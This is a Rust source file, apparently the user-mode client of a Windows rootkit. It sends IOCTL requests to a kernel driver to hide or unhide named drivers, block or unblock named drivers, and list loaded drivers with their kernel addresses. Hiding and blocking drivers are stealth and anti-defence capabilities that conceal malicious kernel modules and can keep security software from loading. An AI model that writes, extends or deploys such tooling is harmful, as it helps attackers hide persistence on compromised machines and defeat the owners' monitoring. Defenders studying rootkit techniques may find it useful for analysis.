use crate::utils::open_driver;
use common::structs::{DriverInfo, TargetDriver};
use std::{ffi::c_void, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::IO::DeviceIoControl,
};

/// Provides operations for managing drivers through a driver interface.
pub struct Driver {
    driver_handle: HANDLE,
}

impl Driver {
    /// Creates a new `Driver` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Driver`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Driver { driver_handle }
    }

    /// Hides or unhides a driver based on its name.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the hide/unhide operation.
    /// * `name` - The name of the driver to hide or unhide.
    /// * `enable` - `true` to hide or `false` to unhide the driver.
    pub fn unhide_hide_driver(self, ioctl_code: u32, name: &String, enable: bool) {
        log::debug!("Attempting to open the driver for {} operation", if enable { "hide" } else { "unhide" });
        log::debug!("Preparing structure for: {}", name);
        let mut info_driver = TargetDriver {
            name: name.to_string(),
            enable,
            ..Default::default()
        };

        log::debug!("Sending DeviceIoControl command to {} driver", if enable { "hide" } else { "unhide" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_driver as *mut _ as *mut c_void,
                size_of::<TargetDriver>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError()});
        } else {
            log::info!("Driver successfully {}hidden", if enable { "" } else { "un" });
        }
    }

    /// Blocks or unblocks a driver by sending an `IOCTL` request.
    ///
    /// # Arguments
    /// 
    /// - `ioctl_code` - The `IOCTL` control code for the operation.
    /// - `name` - The name of the driver to block or unblock.
    /// - `enable` - `true` to block the driver, `false` to unblock.
    pub fn block_driver(self, ioctl_code: u32, name: &String, enable: bool) {
        log::debug!("Preparing structure for: {}", name);
        let mut info_driver = TargetDriver {
            name: name.to_string(),
            enable,
            ..Default::default()
        };

        log::debug!("Sending DeviceIoControl command to {} driver", if enable { "block" } else { "unblock" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_driver as *mut _ as *mut c_void,
                size_of::<TargetDriver>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError()});
        } else {
            log::info!("Driver successfully {}block", if enable { "" } else { "un" });
        }
    }

    /// Enumerates all drivers, retrieving information about each one.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the enumeration operation.
    pub fn enumerate_driver(self, ioctl_code: u32) {
        log::debug!("Attempting to open the driver for enumeration");
        log::debug!("Allocating memory for driver info");
        let mut driver_info: [DriverInfo; 400] = unsafe { std::mem::zeroed() };

        log::debug!("Sending DeviceIoControl command to enumerate drivers");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                null_mut(),
                0,
                driver_info.as_mut_ptr().cast(),
                (driver_info.len() * size_of::<DriverInfo>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            let total_modules = return_buffer as usize / size_of::<DriverInfo>();
            log::info!("Total modules found: {}", total_modules);
            log::info!("Listing drivers:");
            println!("");

            for i in driver_info.iter() {
                if i.address > 0 {
                    let name = match String::from_utf16(&i.name) {
                        Ok(name) => name,
                        Err(err) => {
                            log::error!("UTF-16 decoding error: {:?}", err);
                            continue;
                        }
                    };

                    println!("[{:2}]  {:#018x}  {}", i.index, i.address, name);
                }
            }
            println!("");
            log::info!("Driver enumeration completed.");
        }
    }
}

impl Drop for Driver {
    /// Ensures the driver handle is closed when `Driver` goes out of scope.
    fn drop(&mut self) {
        log::debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
